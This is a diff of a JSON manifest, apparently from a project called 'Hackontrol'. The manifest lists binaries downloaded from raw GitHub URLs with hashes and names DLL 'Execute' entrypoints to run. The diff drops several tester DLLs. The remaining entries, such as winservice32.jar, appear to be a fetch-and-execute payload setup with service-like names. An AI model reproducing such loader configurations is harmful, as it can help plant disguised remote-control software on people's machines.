@@ -24,55 +24,14 @@
 			"file": "winservice32.jar",
 			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/winservice32.jar",
 			"sha384": "5282373811601f81a7d591fa7aa6347df7525079855a308c5b903bdea8751d6aacbcc8c4668a4dbd00a06bcbf8f0a940"
-		},
-		{
-			"file": "dpp.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/dpp.dll",
-			"sha384": "4e794e85b355d7dea9b81d7b70013f5af916123ab742d0cc873ebb06e722fb2bbb7403f1e5cfed10869d0fe635dae6fa"
-		},
-		{
-			"file": "libcrypto-1_1-x64.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/libcrypto-1_1-x64.dll",
-			"sha384": "0d3bb623d2178e44537175f63c31f610c6bb5bae772fc6fd278ca894164369fcf9da46ab70715a5d1606d05d39a18304"
-		},
-		{
-			"file": "libsodium.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/libsodium.dll",
-			"sha384": "b710dc82f0a041eb1cd21158ce19de8e4f0c86607c6fccabba5ba008ccd7ead93027db7aeabcc0aeb75ef15c4497f1ac"
-		},
-		{
-			"file": "libssl-1_1-x64.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/libssl-1_1-x64.dll",
-			"sha384": "065a0e1b279f58974e441aaeacd1a5668cffab634d10d3ede14d5eed1ebf81c29084ee46fe58bddcdd64a5721f5bfe09"
-		},
-		{
-			"file": "libtester32.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/libtester32.dll",
-			"sha384": "7bbc3c2dfc3bd3d24b00b18f498bb35228ab0214fca79ef66123bbe134636cdee904484de659b49bb2769e6ef03034d1"
-		},
-		{
-			"file": "opus.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/opus.dll",
-			"sha384": "ae6b2b741db6f41ae1f8887c18ea021d9c130f6864e1d0a22e20655230a20162518b26c24aa3c254a254ce17656a99fc"
-		},
-		{
-			"file": "zlib1.dll",
-			"url": "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/tester/zlib1.dll",
-			"sha384": "1c83b19954ba465a4676dc12fa9462c5c81d975aa6621b23e700ce466666404f19b2ba180acd397d0a9ed6161c1b4176"
 		}
 	],
 
 	"entrypoint": [
 		{
 			"format": "dll",
-			"file": "libtester32.dll",
-			"function": "Execute"
-		},
-		{
-			"format": "dll",
 			"file": "libruntime32.dll",
-			"function": "Execute",
-			"join": true
+			"function": "Execute"
 		}
 	]
 }
